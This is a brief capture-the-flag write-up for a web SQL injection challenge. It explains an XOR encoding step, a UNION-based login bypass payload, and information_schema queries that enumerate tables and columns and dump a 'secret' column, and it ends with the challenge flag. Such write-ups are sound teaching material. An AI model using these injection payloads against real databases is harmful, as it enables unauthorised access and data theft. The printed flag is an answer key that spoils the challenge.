# SQLi
Author : @Sud0-u53r

### Description: 
#### This is just a regular SQLi... Woah... Wait a minute... Hold your horses. I don't think tools gonna help you this time. Hack with your skills, not with tools.

The page contains source code of the file currently accessed by the user. And also we can easily identify the SQL injection there.

First we have to send the input XORed to document.domain, so that it gets converted into payload correctly. And next, we have to use the payload `' AND 0 union select 1,'c81e728d9d4c2f636f067f89cc14862c';-- -` and give pass param 2. Then it gives ``Welcome
 1!``. 
 
 Now we have a chance to get our output on screen. use ``(select group_concat(table_name) from information_schema.tables where table_schema=database())`` in place of 1 to get list of tables(users). And ``(select group_concat(column_name) from information_schema.columns where table_name='users')`` will get you the list of columns in that table(id,username,password,proffission,secret). Now you have to read all the secrets in it with ``(select group_concat(secret) from users)``.
 
 I did the XOR thing, cause I thought tools wont work on it that way.
 
Flag : Invader{w0w_y0u_m4d3_i7_h4ck3r!_7_4m_impr3s53d!}
